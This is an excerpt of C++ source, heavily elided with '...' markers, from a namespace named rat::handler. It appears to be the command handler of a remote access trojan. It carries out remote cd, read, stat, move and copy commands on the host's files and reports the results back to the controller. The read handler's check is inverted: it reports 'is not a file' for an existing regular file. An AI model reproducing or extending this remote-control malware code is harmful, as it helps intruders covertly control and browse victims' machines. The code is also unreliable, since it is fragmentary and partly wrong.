...
void Handler::handleCdCommand() {
    ...
    this->sendMessage(rat::system::cd(rat::system::normalizePath(command.parameters[0])));
}
...
void Handler::handleReadCommand() {
    ...
    for(const std::string &param : params) {
        ...
        if(file_exists && is_regular_file) {
            ...
            this->sendMessage(fmt::format("Path: {} is not a file", file_path.string()));
            return;
        } else if(!file_exists) {
            this->sendMessage(fmt::format("Path: {} does not exist", file_path.string()));
            return;
        }
    }
}
...
void Handler::handleStatCommand() {
    ...
    if(!std::filesystem::exists(p)) {
        this->sendMessage(fmt::format("File does not exist: {}", command.parameters[0]));
        return;
    }
...
void Handler::handleMvCommand() {
    ...
    if(!std::filesystem::exists(source_path)) {
        this->sendMessage(fmt::format("Source path {} does not exist", source_path.string()));
        return;
    }
    ...
    if(rat::system::isFile(source_path)) {
        if(rat::system::isDir(dist_path)) {
            if(rat::system::renameFile(source_path, dist_path / source_path.filename())) {
                result = fmt::format("File {} moved to {}",
                                     source_path.string(),
            ...
            if(rat::system::renameFile(source_path, dist_path)) {
                result =
                    fmt::format("File {} renamed to {}", source_path.string(), dist_path.string());
            } else {
        ...
        if(rat::system::moveDir(source_path, dist_path)) {
            result =
                fmt::format("Directory {} moved to {}", source_path.string(), dist_path.string());
        } else {
...
void Handler::handleCpCommand() {
    ...
    if(!std::filesystem::exists(source_path)) {
        this->sendMessage(fmt::format("Path: {} does not exist", source_path.string()));
        return;
    }

    if(std::filesystem::exists(dist_path)) {
        this->sendMessage(
            fmt::format("Path {} already exists, overwrite disabled", dist_path.string()));
        return;
    }
    ...
    if(result) {
        this->sendMessage(
            fmt::format("Content of {} copied to {}", source_path.string(), dist_path.string()));
    } else {
        this->sendMessage(
            fmt::format("Failed to copy {} to {}", source_path.string(), dist_path.string()));
    }
}
} // namespace rat::handler
